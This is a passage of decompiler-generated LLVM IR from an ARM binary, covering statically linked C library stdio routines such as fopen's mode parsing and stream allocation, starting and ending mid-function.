  %v2_15cb4 = load i16, i16* %v1_15cb4, align 2
  %v3_15cb4 = zext i16 %v2_15cb4 to i32
  store i32 %v3_15cb4, i32* %r3.global-to-local, align 4
  %v1_15cb8 = and i32 %v3_15cb4, 16384
  %v2_15cb8 = icmp eq i32 %v1_15cb8, 0
  br i1 %v2_15cb8, label %bb49, label %bb48

bb48:                                             ; preds = %dec_label_pc_15cb4
  %v2_15cbc = add i32 %v0_15cb4, 8
  %v3_15cbc = inttoptr i32 %v2_15cbc to i32*
  %v4_15cbc = load i32, i32* %v3_15cbc, align 4
  store i32 %v4_15cbc, i32* %r0.global-to-local, align 4
  br label %bb49

bb49:                                             ; preds = %dec_label_pc_15cb4, %bb48
  %v1_15cc0 = xor i1 %v2_15cb8, true
  call void @__pseudo_cond_branch(i1 %v1_15cc0, i32 ptrtoint (i32* @global_var_1310c.34 to i32))
  store i32 160, i32* %r3.global-to-local, align 4
  %v0_15cc8 = load i32, i32* @r8, align 4
  %v2_15cc8 = add i32 %v0_15cc8, 160
  %v3_15cc8 = inttoptr i32 %v2_15cc8 to i32*
  %v4_15cc8 = load i32, i32* %v3_15cc8, align 4
  store i32 %v4_15cc8, i32* @r5, align 4
  %v1_15ccc = add i32 %v4_15cc8, 8
  %v2_15ccc = inttoptr i32 %v1_15ccc to i32*
  %v3_15ccc = load i32, i32* %v2_15ccc, align 4
  store i32 %v3_15ccc, i32* %r3.global-to-local, align 4
  %v1_15cd0 = load i32, i32* %sl.global-to-local, align 4
  %v3_15cd0 = icmp uge i32 %v3_15ccc, %v1_15cd0
  store i1 %v3_15cd0, i1* %cpsr_c.global-to-local, align 1
  %v9_15cd0 = icmp eq i32 %v3_15ccc, %v1_15cd0
  br i1 %v9_15cd0, label %dec_label_pc_15d18, label %dec_label_pc_15cd8

dec_label_pc_15cd8:                               ; preds = %bb49
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 %v4_15cc8, i32* %r2.global-to-local, align 4
  store i32 0, i32* @r4, align 4
  %v1_15ce475 = inttoptr i32 %v4_15cc8 to i32*
  %v2_15ce476 = load i32, i32* %v1_15ce475, align 4
  store i32 %v2_15ce476, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v9_15ce878 = icmp eq i32 %v2_15ce476, 0
  br i1 %v9_15ce878, label %dec_label_pc_15cf0, label %dec_label_pc_15d08

dec_label_pc_15cf0:                               ; preds = %dec_label_pc_15cd8, %dec_label_pc_15cf0.dec_label_pc_15ce4_crit_edge
  %v0_15cf079 = phi i32 [ %v1_15ce8.pre, %dec_label_pc_15cf0.dec_label_pc_15ce4_crit_edge ], [ 0, %dec_label_pc_15cd8 ]
  store i32 %v0_15cf079, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_15d00 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_15d00, label %dec_label_pc_15d04, label %dec_label_pc_15cf0.dec_label_pc_15ce4_crit_edge

dec_label_pc_15cf0.dec_label_pc_15ce4_crit_edge:  ; preds = %dec_label_pc_15cf0
  %v0_15ce4.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_15ce8.pre = load i32, i32* @r4, align 4
  %v1_15ce4 = inttoptr i32 %v0_15ce4.pre to i32*
  %v2_15ce4 = load i32, i32* %v1_15ce4, align 4
  store i32 %v2_15ce4, i32* %r3.global-to-local, align 4
  %v3_15ce8 = icmp uge i32 %v2_15ce4, %v1_15ce8.pre
  store i1 %v3_15ce8, i1* %cpsr_c.global-to-local, align 1
  %v9_15ce8 = icmp eq i32 %v2_15ce4, %v1_15ce8.pre
  br i1 %v9_15ce8, label %dec_label_pc_15cf0, label %dec_label_pc_15d08

dec_label_pc_15d04:                               ; preds = %dec_label_pc_15cf0
  %v0_15d04 = load i32, i32* @r4, align 4
  store i32 %v0_15d04, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_15d08

dec_label_pc_15d08:                               ; preds = %dec_label_pc_15cd8, %dec_label_pc_15cf0.dec_label_pc_15ce4_crit_edge, %dec_label_pc_15d04
  %v0_15d08 = phi i32 [ %v0_15d04, %dec_label_pc_15d04 ], [ %v2_15ce476, %dec_label_pc_15cd8 ], [ %v2_15ce4, %dec_label_pc_15cf0.dec_label_pc_15ce4_crit_edge ]
  %v1_15d08 = phi i32 [ %v0_15d04, %dec_label_pc_15d04 ], [ 0, %dec_label_pc_15cd8 ], [ %v1_15ce8.pre, %dec_label_pc_15cf0.dec_label_pc_15ce4_crit_edge ]
  %v3_15d08 = icmp uge i32 %v0_15d08, %v1_15d08
  store i1 %v3_15d08, i1* %cpsr_c.global-to-local, align 1
  %v9_15d08 = icmp eq i32 %v0_15d08, %v1_15d08
  br i1 %v9_15d08, label %bb51, label %bb50

bb50:                                             ; preds = %dec_label_pc_15d08
  %v1_15d0c = load i32, i32* @r5, align 4
  store i32 %v1_15d0c, i32* %r0.global-to-local, align 4
  br label %bb51

bb51:                                             ; preds = %dec_label_pc_15d08, %bb50
  %v1_15d10 = xor i1 %v9_15d08, true
  call void @__pseudo_cond_branch(i1 %v1_15d10, i32 ptrtoint (i32* @global_var_142c4.496 to i32))
  %v0_15d14 = load i32, i32* %sl.global-to-local, align 4
  %v1_15d14 = load i32, i32* @r5, align 4
  %v2_15d14 = add i32 %v1_15d14, 8
  %v3_15d14 = inttoptr i32 %v2_15d14 to i32*
  store i32 %v0_15d14, i32* %v3_15d14, align 4
  %v0_15d1c.pre = load i32, i32* @r8, align 4
  br label %dec_label_pc_15d18

dec_label_pc_15d18:                               ; preds = %bb49, %bb51
  %v0_15d1c = phi i32 [ %v0_15cc8, %bb49 ], [ %v0_15d1c.pre, %bb51 ]
  store i32 80, i32* %r3.global-to-local, align 4
  %v2_15d1c = add i32 %v0_15d1c, 80
  %v3_15d1c = inttoptr i32 %v2_15d1c to i32*
  %v4_15d1c = load i32, i32* %v3_15d1c, align 4
  store i32 %v4_15d1c, i32* %r2.global-to-local, align 4
  store i32 160, i32* %r3.global-to-local, align 4
  %v2_15d24 = add i32 %v0_15d1c, 160
  %v3_15d24 = inttoptr i32 %v2_15d24 to i32*
  %v4_15d24 = load i32, i32* %v3_15d24, align 4
  store i32 %v4_15d24, i32* %r0.global-to-local, align 4
  %v1_15d28 = inttoptr i32 %v4_15d1c to i32*
  %v2_15d28 = load i32, i32* %v1_15d28, align 4
  store i32 %v2_15d28, i32* %r3.global-to-local, align 4
  %v1_15d2c = add i32 %v4_15d24, 4
  %v2_15d2c = inttoptr i32 %v1_15d2c to i32*
  %v3_15d2c = load i32, i32* %v2_15d2c, align 4
  store i32 %v3_15d2c, i32* %r1.global-to-local, align 4
  %v1_15d30 = add i32 %v2_15d28, 1
  store i32 %v1_15d30, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_15d34 = icmp eq i32 %v3_15d2c, 0
  store i32 %v1_15d30, i32* %v1_15d28, align 4
  br i1 %v2_15d34, label %dec_label_pc_15d40, label %dec_label_pc_15da0

dec_label_pc_15d40:                               ; preds = %dec_label_pc_15d18
  %v0_15d40 = load i32, i32* %r1.global-to-local, align 4
  %v1_15d40 = load i32, i32* %r0.global-to-local, align 4
  %v2_15d40 = add i32 %v1_15d40, 8
  %v3_15d40 = inttoptr i32 %v2_15d40 to i32*
  store i32 %v0_15d40, i32* %v3_15d40, align 4
  %v0_15d44 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_15d44, i32* @r5, align 4
  br label %dec_label_pc_15d48

dec_label_pc_15d48:                               ; preds = %dec_label_pc_15d78.dec_label_pc_15d48_crit_edge, %dec_label_pc_15d40
  %v0_15d48 = phi i32 [ %v0_15d48.pre, %dec_label_pc_15d78.dec_label_pc_15d48_crit_edge ], [ %v0_15d44, %dec_label_pc_15d40 ]
  %v1_15d48 = inttoptr i32 %v0_15d48 to i32*
  %v2_15d48 = load i32, i32* %v1_15d48, align 4
  store i32 %v2_15d48, i32* @r4, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 %v0_15d48, i32* %r2.global-to-local, align 4
  %v2_15d5464 = load i32, i32* %v1_15d48, align 4
  store i32 %v2_15d5464, i32* %r3.global-to-local, align 4
  %v3_15d5866 = icmp uge i32 %v2_15d5464, %v2_15d48
  store i1 %v3_15d5866, i1* %cpsr_c.global-to-local, align 1
  %v9_15d5872 = icmp eq i32 %v2_15d5464, %v2_15d48
  br i1 %v9_15d5872, label %dec_label_pc_15d60, label %dec_label_pc_15d78

dec_label_pc_15d60:                               ; preds = %dec_label_pc_15d48, %dec_label_pc_15d60.dec_label_pc_15d54_crit_edge
  %v0_15d6073 = phi i32 [ %v1_15d58.pre, %dec_label_pc_15d60.dec_label_pc_15d54_crit_edge ], [ %v2_15d48, %dec_label_pc_15d48 ]
  store i32 %v0_15d6073, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_15d70 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_15d70, label %dec_label_pc_15d74, label %dec_label_pc_15d60.dec_label_pc_15d54_crit_edge

dec_label_pc_15d60.dec_label_pc_15d54_crit_edge:  ; preds = %dec_label_pc_15d60
  %v0_15d54.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_15d58.pre = load i32, i32* @r4, align 4
  %v1_15d54 = inttoptr i32 %v0_15d54.pre to i32*
  %v2_15d54 = load i32, i32* %v1_15d54, align 4
  store i32 %v2_15d54, i32* %r3.global-to-local, align 4
  %v3_15d58 = icmp uge i32 %v2_15d54, %v1_15d58.pre
  store i1 %v3_15d58, i1* %cpsr_c.global-to-local, align 1
  %v9_15d58 = icmp eq i32 %v2_15d54, %v1_15d58.pre
  br i1 %v9_15d58, label %dec_label_pc_15d60, label %dec_label_pc_15d78

dec_label_pc_15d74:                               ; preds = %dec_label_pc_15d60
  %v0_15d74 = load i32, i32* @r4, align 4
  store i32 %v0_15d74, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_15d78

dec_label_pc_15d78:                               ; preds = %dec_label_pc_15d48, %dec_label_pc_15d60.dec_label_pc_15d54_crit_edge, %dec_label_pc_15d74
  %v0_15d80 = phi i32 [ %v0_15d74, %dec_label_pc_15d74 ], [ %v2_15d5464, %dec_label_pc_15d48 ], [ %v2_15d54, %dec_label_pc_15d60.dec_label_pc_15d54_crit_edge ]
  %v1_15d78 = phi i32 [ %v0_15d74, %dec_label_pc_15d74 ], [ %v2_15d48, %dec_label_pc_15d48 ], [ %v1_15d58.pre, %dec_label_pc_15d60.dec_label_pc_15d54_crit_edge ]
  %v3_15d78 = icmp uge i32 %v0_15d80, %v1_15d78
  store i1 %v3_15d78, i1* %cpsr_c.global-to-local, align 1
  %v9_15d78 = icmp eq i32 %v0_15d80, %v1_15d78
  br i1 %v9_15d78, label %dec_label_pc_15d80, label %dec_label_pc_15d78.dec_label_pc_15d48_crit_edge

dec_label_pc_15d78.dec_label_pc_15d48_crit_edge:  ; preds = %dec_label_pc_15d78
  %v0_15d48.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_15d48

dec_label_pc_15d80:                               ; preds = %dec_label_pc_15d78
  %v2_15d80 = icmp ne i32 %v1_15d78, 0
  store i1 %v2_15d80, i1* %cpsr_c.global-to-local, align 1
  %v7_15d84 = icmp slt i32 %v1_15d78, 2
  br i1 %v7_15d84, label %dec_label_pc_15da0, label %dec_label_pc_15d88

dec_label_pc_15d88:                               ; preds = %dec_label_pc_15d80
  %v0_15d88 = load i32, i32* @r5, align 4
  store i32 %v0_15d88, i32* %r0.global-to-local, align 4
  %v0_15d8c = load i32, i32* %r1.global-to-local, align 4
  %v1_15d8c = add i32 %v0_15d8c, 129
  store i32 %v1_15d8c, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_15da0

dec_label_pc_15da0:                               ; preds = %dec_label_pc_15d18, %dec_label_pc_15d88, %dec_label_pc_15d80
  %v0_15da0 = call i32 @_stdio_openlist_dec_use()
  %v0_15da4 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_15da4, i32* %r0.global-to-local, align 4
  %v2_15dac = load i32, i32* %stack_var_-36, align 4
  store i32 %v2_15dac, i32* @r4, align 4
  store i32 %v6_15a94, i32* @r5, align 4
  store i32 %v9_15a94, i32* @r6, align 4
  store i32 %v12_15a94, i32* @r7, align 4
  ret i32 %v0_15da4

; uselistorder directives
  uselistorder i32 %v0_15d74, { 1, 0, 2 }
  uselistorder i32 %v1_15d58.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_15d48, { 1, 0 }
  uselistorder i32 %v0_15d1c, { 1, 0 }
  uselistorder i32 %v0_15d04, { 1, 0, 2 }
  uselistorder i32 %v1_15ce8.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v1_15cd0, { 1, 0 }
  uselistorder i32 %v0_15c88, { 1, 0, 2 }
  uselistorder i32 %v1_15c6c.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_15bfc, { 1, 0, 2 }
  uselistorder i32 %v1_15be0.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_15bd0, { 1, 0 }
  uselistorder i32 %v0_15b8c, { 1, 0, 2 }
  uselistorder i32 %v1_15b70.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_15b50, { 1, 0 }
  uselistorder i32 %v1_15adc.pre, { 2, 1, 0 }
  uselistorder i32* %r3.global-to-local, { 3, 4, 6, 5, 45, 7, 8, 9, 10, 11, 13, 12, 44, 14, 17, 15, 16, 18, 20, 19, 2, 21, 22, 23, 24, 25, 27, 26, 1, 28, 29, 30, 31, 33, 32, 0, 34, 35, 36, 37, 38, 39, 40, 42, 41, 46, 43 }
  uselistorder i32* %r0.global-to-local, { 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 25, 21, 22, 0, 23, 24, 26, 1 }
  uselistorder i32* %fp.global-to-local, { 1, 0, 2 }
  uselistorder i1* %cpsr_c.global-to-local, { 0, 1, 2, 26, 27, 3, 4, 5, 34, 35, 6, 7, 8, 9, 28, 29, 10, 11, 12, 13, 14, 32, 33, 15, 16, 17, 30, 31, 18, 19, 20, 21, 24, 25, 22, 23 }
  uselistorder i32 (i32)* @__GI___libc_close, { 28, 26, 5, 32, 31, 4, 30, 29, 3, 2, 27, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 1, 0 }
  uselistorder label %dec_label_pc_15da0, { 1, 2, 0 }
  uselistorder label %dec_label_pc_15d78, { 2, 1, 0 }
  uselistorder label %dec_label_pc_15d60, { 1, 0 }
  uselistorder label %dec_label_pc_15d18, { 1, 0 }
  uselistorder label %bb51, { 1, 0 }
  uselistorder label %dec_label_pc_15d08, { 2, 1, 0 }
  uselistorder label %dec_label_pc_15cf0, { 1, 0 }
  uselistorder label %bb49, { 1, 0 }
  uselistorder label %dec_label_pc_15cb4, { 2, 3, 0, 1 }
  uselistorder label %dec_label_pc_15c8c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_15c74, { 1, 0 }
  uselistorder label %dec_label_pc_15c28, { 1, 2, 0 }
  uselistorder label %dec_label_pc_15c00, { 2, 1, 0 }
  uselistorder label %dec_label_pc_15be8, { 1, 0 }
  uselistorder label %dec_label_pc_15ba0, { 1, 0 }
  uselistorder label %bb47, { 1, 0 }
  uselistorder label %dec_label_pc_15b90, { 2, 1, 0 }
  uselistorder label %dec_label_pc_15b78, { 1, 0 }
  uselistorder label %bb45, { 1, 0 }
  uselistorder label %bb43, { 1, 0 }
  uselistorder label %dec_label_pc_15b18, { 1, 0 }
  uselistorder label %dec_label_pc_15b0c, { 1, 0 }
  uselistorder label %bb41, { 1, 0 }
  uselistorder label %dec_label_pc_15afc, { 2, 1, 0 }
  uselistorder label %dec_label_pc_15ae4, { 1, 0 }
}

define i32 @function_15db8(i32 %arg1) local_unnamed_addr {
dec_label_pc_15db8:
  %v0_15db8 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_15db8, label %bb, label %.thread1

bb:                                               ; preds = %dec_label_pc_15db8
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_15db8, %bb
  %v10_15dc0 = phi i32 [ %arg1, %dec_label_pc_15db8 ], [ 0, %bb ]
  ret i32 %v10_15dc0

; uselistorder directives
  uselistorder label %.thread1, { 1, 0 }
}

define i32 @__GI_fopen() local_unnamed_addr {
entry:
  store i32 0, i32* @r2, align 4
  store i32 -1, i32* @r3, align 4
  %v0_15dd4 = call i32 @_stdio_fopen()
  ret i32 %v0_15dd4
}

define i32 @_stdio_fopen() local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_15de4 = load i32, i32* @r4, align 4
  store i32 %v3_15de4, i32* %stack_var_-24, align 4
  %v6_15de4 = load i32, i32* @r5, align 4
  %v9_15de4 = load i32, i32* @r6, align 4
  %v12_15de4 = load i32, i32* @r7, align 4
  %v15_15de4 = load i32, i32* @r8, align 4
  %v0_15de8 = load i32, i32* @r1, align 4
  %v1_15de8 = inttoptr i32 %v0_15de8 to i8*
  %v2_15de8 = load i8, i8* %v1_15de8, align 1
  %v2_15df0 = icmp ugt i8 %v2_15de8, 113
  store i1 %v2_15df0, i1* %cpsr_c.global-to-local, align 1
  %v7_15df0 = icmp eq i8 %v2_15de8, 114
  store i32 ptrtoint (i32* @global_var_21d10.338 to i32), i32* @r8, align 4
  %v0_15dfc = load i32, i32* @r0, align 4
  store i32 %v0_15dfc, i32* @r7, align 4
  %v0_15e00 = load i32, i32* @r2, align 4
  store i32 %v0_15e00, i32* @r5, align 4
  %v0_15e04 = load i32, i32* @r3, align 4
  store i32 %v0_15e04, i32* @r6, align 4
  br i1 %v7_15df0, label %dec_label_pc_15e58, label %dec_label_pc_15e0c

dec_label_pc_15e0c:                               ; preds = %entry
  %v2_15e0c = icmp ugt i8 %v2_15de8, 118
  store i1 %v2_15e0c, i1* %cpsr_c.global-to-local, align 1
  %v7_15e0c = icmp eq i8 %v2_15de8, 119
  br i1 %v7_15e0c, label %bb, label %dec_label_pc_15e18

bb:                                               ; preds = %dec_label_pc_15e0c
  store i32 577, i32* @r4, align 4
  br label %dec_label_pc_15e5c

dec_label_pc_15e18:                               ; preds = %dec_label_pc_15e0c
  %v2_15e18 = icmp ugt i8 %v2_15de8, 96
  store i1 %v2_15e18, i1* %cpsr_c.global-to-local, align 1
  %v7_15e18 = icmp eq i8 %v2_15de8, 97
  br i1 %v7_15e18, label %bb49, label %dec_label_pc_15e24

bb49:                                             ; preds = %dec_label_pc_15e18
  store i32 1089, i32* @r4, align 4
  br label %dec_label_pc_15e5c

dec_label_pc_15e24:                               ; preds = %dec_label_pc_15e18, %dec_label_pc_15ef4, %dec_label_pc_15ec8
  store i32 48948, i32* %r2.global-to-local, align 4
  %v0_15e28 = call i32 @__aeabi_read_tp()
  store i32 %v0_15e28, i32* %r0.global-to-local, align 4
  %v3_15e2c = load i16, i16* @global_var_21d68.334, align 2
  %v4_15e2c = sext i16 %v3_15e2c to i32
  store i32 %v4_15e2c, i32* %r2.global-to-local, align 4
  store i32 22, i32* %r3.global-to-local, align 4
  %v0_15e34 = load i32, i32* @r5, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_15e34 = icmp eq i32 %v0_15e34, 0
  %v3_15e38 = add i32 %v4_15e2c, %v0_15e28
  %v4_15e38 = inttoptr i32 %v3_15e38 to i32*
  store i32 22, i32* %v4_15e38, align 4
  br i1 %v2_15e34, label %dec_label_pc_161fc, label %dec_label_pc_15e40

dec_label_pc_15e40:                               ; preds = %dec_label_pc_15f18._crit_edge, %dec_label_pc_15e24
  %v0_15e40 = load i32, i32* @r5, align 4
  %v1_15e40 = inttoptr i32 %v0_15e40 to i16*
  %v2_15e40 = load i16, i16* %v1_15e40, align 2
  %v3_15e40 = zext i16 %v2_15e40 to i32
  store i32 %v3_15e40, i32* %r3.global-to-local, align 4
  %v1_15e44 = and i32 %v3_15e40, 8192
  %v2_15e44 = icmp eq i32 %v1_15e44, 0
  br i1 %v2_15e44, label %dec_label_pc_161fc, label %dec_label_pc_15e4c

dec_label_pc_15e4c:                               ; preds = %dec_label_pc_15e40
  store i32 %v0_15e40, i32* @r0, align 4
  %v0_15e50 = call i32 @free()
  store i32 %v0_15e50, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_161fc

dec_label_pc_15e58:                               ; preds = %entry
  store i32 0, i32* @r4, align 4
  br label %dec_label_pc_15e5c

dec_label_pc_15e5c:                               ; preds = %bb, %bb49, %dec_label_pc_15e58
  %v1_15e74 = phi i32 [ 1089, %bb49 ], [ 577, %bb ], [ 1, %dec_label_pc_15e58 ]
  %v1_15e5c = add i32 %v0_15de8, 1
  %v2_15e5c = inttoptr i32 %v1_15e5c to i8*
  %v3_15e5c = load i8, i8* %v2_15e5c, align 1
  %v2_15e60 = icmp ugt i8 %v3_15e5c, 97
  store i1 %v2_15e60, i1* %cpsr_c.global-to-local, align 1
  %v7_15e60 = icmp eq i8 %v3_15e5c, 98
  %v1_15e5c.v0_15de8 = select i1 %v7_15e60, i32 %v1_15e5c, i32 %v0_15de8
  store i32 %v1_15e5c.v0_15de8, i32* %r3.global-to-local, align 4
  %v1_15e6c = add i32 %v1_15e5c.v0_15de8, 1
  %v2_15e6c = inttoptr i32 %v1_15e6c to i8*
  %v3_15e6c = load i8, i8* %v2_15e6c, align 1
  %v4_15e6c = zext i8 %v3_15e6c to i32
  store i32 %v4_15e6c, i32* @r3, align 4
  %v2_15e70 = icmp ugt i8 %v3_15e6c, 42
  store i1 %v2_15e70, i1* %cpsr_c.global-to-local, align 1
  %v7_15e70 = icmp eq i8 %v3_15e6c, 43
  br i1 %v7_15e70, label %bb52, label %.thread3

bb52:                                             ; preds = %dec_label_pc_15e5c
  store i32 %v1_15e74, i32* @r3, align 4
  %v2_15e78 = add nuw nsw i32 %v1_15e74, 1
  store i32 %v2_15e78, i32* @r4, align 4
  br label %.thread3

.thread3:                                         ; preds = %dec_label_pc_15e5c, %bb52
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_15e7c = icmp eq i32 %v0_15e00, 0
  br i1 %v2_15e7c, label %dec_label_pc_15e84, label %dec_label_pc_15ec0

dec_label_pc_15e84:                               ; preds = %.thread3
  store i32 68, i32* @r0, align 4
  %v0_15e88 = call i32 @malloc()
  store i32 %v0_15e88, i32* %r0.global-to-local, align 4
  store i32 %v0_15e88, i32* @r5, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v3_15e8c = icmp eq i32 %v0_15e88, 0
  br i1 %v3_15e8c, label %dec_label_pc_16200, label %dec_label_pc_15e94

dec_label_pc_15e94:                               ; preds = %dec_label_pc_15e84
  %v0_15e98 = load i32, i32* @r8, align 4
  %v2_15e98 = add i32 %v0_15e98, -33136
  store i32 %v2_15e98, i32* %r3.global-to-local, align 4
  %v1_15e9c = inttoptr i32 %v2_15e98 to i32*
  %v2_15e9c = load i32, i32* %v1_15e9c, align 4
  store i32 %v2_15e9c, i32* %r0.global-to-local, align 4
  %v3_15e9c = add i32 %v0_15e98, -33132
  %v4_15e9c = inttoptr i32 %v3_15e9c to i32*
  %v5_15e9c = load i32, i32* %v4_15e9c, align 4
  store i32 %v5_15e9c, i32* @r1, align 4
  %v6_15e9c = add i32 %v0_15e98, -33128
  %v7_15e9c = inttoptr i32 %v6_15e9c to i32*
  %v8_15e9c = load i32, i32* %v7_15e9c, align 4
  store i32 %v8_15e9c, i32* %r2.global-to-local, align 4
  %v2_15ea8 = add i32 %v0_15e88, 8
  %v3_15ea8 = inttoptr i32 %v2_15ea8 to i32*
  store i32 0, i32* %v3_15ea8, align 4
  %v2_15eb0 = load i32, i32* @r5, align 4
  %v3_15eb0 = inttoptr i32 %v2_15eb0 to i16*
  store i16 8192, i16* %v3_15eb0, align 2
  %v2_15eb4 = load i32, i32* %r0.global-to-local, align 4
  %v0_15eb8 = load i32, i32* @r5, align 4
  %v1_15eb8 = add i32 %v0_15eb8, 56
  store i32 %v1_15eb8, i32* @r3, align 4
  %v1_15ebc = inttoptr i32 %v1_15eb8 to i32*
  store i32 %v2_15eb4, i32* %v1_15ebc, align 4
  %v3_15ebc = add i32 %v0_15eb8, 60
  %v4_15ebc = inttoptr i32 %v3_15ebc to i32*
  %v5_15ebc = load i32, i32* @r1, align 4
  store i32 %v5_15ebc, i32* %v4_15ebc, align 4
  %v6_15ebc = add i32 %v0_15eb8, 64
  %v7_15ebc = inttoptr i32 %v6_15ebc to i32*
  %v8_15ebc = load i32, i32* %r2.global-to-local, align 4
  store i32 %v8_15ebc, i32* %v7_15ebc, align 4
  %v0_15ec0.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_15ec0

dec_label_pc_15ec0:                               ; preds = %.thread3, %dec_label_pc_15e94
  %v0_15f18 = phi i32 [ %v0_15e04, %.thread3 ], [ %v0_15ec0.pre, %dec_label_pc_15e94 ]
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v1_15ec0 = icmp slt i32 %v0_15f18, 0
  br i1 %v1_15ec0, label %dec_label_pc_15f18, label %dec_label_pc_15ec8

dec_label_pc_15ec8:                               ; preds = %dec_label_pc_15ec0
  %v0_15ecc = load i32, i32* @r4, align 4
  %v2_15ecc = and i32 %v0_15ecc, 131075
  %v1_15ed0 = add nuw nsw i32 %v2_15ecc, 1
  store i32 %v1_15ed0, i32* %r2.global-to-local, align 4
  %v0_15ed4 = load i32, i32* @r7, align 4
  %v1_15ed4 = add i32 %v0_15ed4, 1
  %v2_15ed8 = and i32 %v1_15ed4, %v1_15ed0
  store i32 %v2_15ed8, i32* %r3.global-to-local, align 4
  %v3_15edc = icmp uge i32 %v2_15ed8, %v1_15ed0
  store i1 %v3_15edc, i1* %cpsr_c.global-to-local, align 1
  %v9_15edc = icmp eq i32 %v2_15ed8, %v1_15ed0
  %v1_15ee0 = load i32, i32* @r5, align 4
  %v2_15ee0 = add i32 %v1_15ee0, 4
  %v3_15ee0 = inttoptr i32 %v2_15ee0 to i32*
  store i32 %v0_15f18, i32* %v3_15ee0, align 4
  br i1 %v9_15edc, label %dec_label_pc_15ee8, label %dec_label_pc_15e24

dec_label_pc_15ee8:                               ; preds = %dec_label_pc_15ec8
  %v0_15ee8 = load i32, i32* @r4, align 4
  %v1_15ee8 = load i32, i32* @r7, align 4
  %v2_15ee8 = sub i32 -1, %v1_15ee8
  %v3_15ee8 = and i32 %v0_15ee8, %v2_15ee8
  store i32 %v3_15ee8, i32* @r3, align 4
  %v1_15eec = and i32 %v3_15ee8, 1024
  %v2_15eec = icmp eq i32 %v1_15eec, 0
  br i1 %v2_15eec, label %dec_label_pc_15f0c, label %dec_label_pc_15ef4

dec_label_pc_15ef4:                               ; preds = %dec_label_pc_15ee8
  %v0_15ef4 = load i32, i32* @r6, align 4
  store i32 %v0_15ef4, i32* %r0.global-to-local, align 4
  store i32 1024, i32* @r2, align 4
  %v2_15f00 = call i32 @__libc_fcntl(i32 %v0_15ef4, i32 4)
  store i32 %v2_15f00, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_15f04 = icmp eq i32 %v2_15f00, 0
  br i1 %v2_15f04, label %dec_label_pc_15ef4.dec_label_pc_15f0c_crit_edge, label %dec_label_pc_15e24

dec_label_pc_15ef4.dec_label_pc_15f0c_crit_edge:  ; preds = %dec_label_pc_15ef4
  %v0_15f0c.pre = load i32, i32* @r7, align 4
  %v0_15f10.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_15f0c

dec_label_pc_15f0c:                               ; preds = %dec_label_pc_15ef4.dec_label_pc_15f0c_crit_edge, %dec_label_pc_15ee8
  %v0_15f10 = phi i32 [ %v0_15f10.pre, %dec_label_pc_15ef4.dec_label_pc_15f0c_crit_edge ], [ %v0_15ee8, %dec_label_pc_15ee8 ]
  %v0_15f0c = phi i32 [ %v0_15f0c.pre, %dec_label_pc_15ef4.dec_label_pc_15f0c_crit_edge ], [ %v1_15ee8, %dec_label_pc_15ee8 ]
  %v1_15f0c = and i32 %v0_15f0c, 131072
  store i32 %v1_15f0c, i32* %r3.global-to-local, align 4
  %v2_15f10 = or i32 %v1_15f0c, %v0_15f10
  store i32 %v2_15f10, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_15f3c

dec_label_pc_15f18:                               ; preds = %dec_label_pc_15ec0
  %v2_15f18 = icmp eq i32 %v0_15f18, -1
  store i1 %v2_15f18, i1* %cpsr_c.global-to-local, align 1
  %v7_15f18 = icmp eq i32 %v0_15f18, -1
  %v0_15f24.pre = load i32, i32* @r4, align 4
  br i1 %v7_15f18, label %dec_label_pc_15f18._crit_edge, label %bb53

bb53:                                             ; preds = %dec_label_pc_15f18
  %v2_15f1c = or i32 %v0_15f24.pre, 131072
  store i32 %v2_15f1c, i32* @r4, align 4
  br label %dec_label_pc_15f18._crit_edge

dec_label_pc_15f18._crit_edge:                    ; preds = %dec_label_pc_15f18, %bb53
  %v0_15f24 = phi i32 [ %v2_15f1c, %bb53 ], [ %v0_15f24.pre, %dec_label_pc_15f18 ]
  %v0_15f20 = load i32, i32* @r7, align 4
